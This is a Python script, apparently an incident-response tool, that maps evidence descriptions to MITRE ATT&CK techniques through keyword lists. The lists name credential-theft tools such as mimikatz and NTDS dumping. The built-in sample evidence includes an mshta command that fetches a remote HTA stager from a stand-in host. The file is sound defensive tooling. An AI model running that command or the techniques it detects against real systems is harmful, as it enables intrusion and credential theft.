#!/usr/bin/env python3
"""
Tool: classify_evidence.py
Maps free-text evidence items to ATT&CK techniques.
"""

import sys
import re

# Evidence-to-technique keyword mapping
KEYWORD_MAP = [
    {
        "keywords": ["lnk", ".lnk attachment", "shortcut"],
        "techniques": [("T1566.001", "Phishing: Spearphishing Attachment", "Initial Access", "HIGH"),
                       ("T1204.002", "User Execution: Malicious File", "Execution", "HIGH")]
    },
    {
        "keywords": ["mshta", "mshta.exe"],
        "techniques": [("T1218.005", "Signed Binary Proxy Execution: Mshta", "Defense Evasion", "HIGH")]
    },
    {
        "keywords": ["vbscript", "wscript", "cscript", "hta"],
        "techniques": [("T1059.005", "Command and Scripting Interpreter: Visual Basic", "Execution", "HIGH")]
    },
    {
        "keywords": ["cobalt strike", "beacon", "cobaltstrike"],
        "techniques": [("T1071.001", "Application Layer Protocol: Web Protocols", "C2", "HIGH"),
                       ("T1573.002", "Encrypted Channel: Asymmetric Cryptography", "C2", "MEDIUM")]
    },
    {
        "keywords": ["registry run", "run key", "hkcu\\software\\microsoft\\windows\\currentversion\\run"],
        "techniques": [("T1547.001", "Boot or Logon Autostart Execution: Registry Run Keys", "Persistence", "HIGH")]
    },
    {
        "keywords": ["arp -a", "ping sweep", "netscan", "nmap"],
        "techniques": [("T1018", "Remote System Discovery", "Discovery", "HIGH"),
                       ("T1046", "Network Service Discovery", "Discovery", "HIGH")]
    },
    {
        "keywords": ["smb", "admin share", "\\\\", "lateral"],
        "techniques": [("T1021.002", "Remote Services: SMB/Windows Admin Shares", "Lateral Movement", "HIGH"),
                       ("T1570", "Lateral Tool Transfer", "Lateral Movement", "MEDIUM")]
    },
    {
        "keywords": ["ntds.dit", "ntdsutil", "volume shadow copy", "vss"],
        "techniques": [("T1003.003", "OS Credential Dumping: NTDS", "Credential Access", "HIGH")]
    },
    {
        "keywords": ["lsass", "mimikatz", "sekurlsa"],
        "techniques": [("T1003.001", "OS Credential Dumping: LSASS Memory", "Credential Access", "HIGH")]
    },
    {
        "keywords": ["scheduled task", "schtasks"],
        "techniques": [("T1053.005", "Scheduled Task/Job: Scheduled Task", "Persistence", "HIGH")]
    },
    {
        "keywords": ["gpo", "group policy", "gpupdate"],
        "techniques": [("T1484.001", "Domain Policy Modification: Group Policy Modification", "Defense Evasion", "HIGH")]
    },
    {
        "keywords": ["ransomware", "encrypted for impact", "ransom", ".encrypted"],
        "techniques": [("T1486", "Data Encrypted for Impact", "Impact", "HIGH")]
    },
    {
        "keywords": ["staging", "archive", "zip", "7z", "rar", "data exfil"],
        "techniques": [("T1074.002", "Remote Data Staging", "Collection", "HIGH"),
                       ("T1560.001", "Archive Collected Data: Archive via Utility", "Collection", "MEDIUM")]
    },
    {
        "keywords": ["https c2", "port 443", "ssl c2", "tls beacon"],
        "techniques": [("T1071.001", "Application Layer Protocol: Web Protocols", "C2", "HIGH"),
                       ("T1573.002", "Encrypted Channel: Asymmetric Cryptography", "C2", "HIGH")]
    },
    {
        "keywords": ["download", "ingress", "dropper", "stager"],
        "techniques": [("T1105", "Ingress Tool Transfer", "C2", "HIGH")]
    },
    {
        "keywords": ["-enc", "-encodedcommand", "base64", "obfuscat"],
        "techniques": [("T1027", "Obfuscated Files or Information", "Defense Evasion", "MEDIUM")]
    },
]

def classify_evidence(text):
    text_lower = text.lower()
    matches = []
    seen = set()
    for mapping in KEYWORD_MAP:
        if any(kw in text_lower for kw in mapping["keywords"]):
            for tech in mapping["techniques"]:
                if tech[0] not in seen:
                    matches.append(tech)
                    seen.add(tech[0])
    return matches

def main():
    evidence_file = None
    for i, arg in enumerate(sys.argv):
        if arg == "--evidence-file" and i + 1 < len(sys.argv):
            evidence_file = sys.argv[i + 1]

    if evidence_file:
        try:
            with open(evidence_file) as f:
                lines = [l.strip() for l in f if l.strip() and not l.startswith("#") and not l.startswith("=")]
        except FileNotFoundError:
            print(f"File not found: {evidence_file}")
            sys.exit(1)
    else:
        lines = [
            "Email with .lnk attachment delivered to finance department",
            "LNK file executed cmd /c mshta.exe http://bad-host.xyz/stage2.hta",
            "MSHTA executed HTA file VBScript payload",
            "Cobalt Strike beacon calling back on HTTPS port 443",
            "Beacon persistence via registry Run key",
            "arp -a ping sweep port scan of internal /24",
            "Lateral tool transfer via SMB beacon.dll staged",
            "NTDS.dit obtained via Volume Shadow Copy",
            "Scheduled tasks created on Domain Controllers",
            "500GB of data staged to encrypted SMB share",
            "Ransomware deployed to all systems via GPO Group Policy",
        ]

    for i, line in enumerate(lines, 1):
        if not line:
            continue
        techniques = classify_evidence(line)
        print(f"\nEvidence Item {i}: {line}")
        if techniques:
            for tid, tname, tactic, conf in techniques:
                print(f"  → {tid}: {tname} ({tactic}, Confidence: {conf})")
        else:
            print("  → No automatic match — manual review required")

if __name__ == "__main__":
    main()
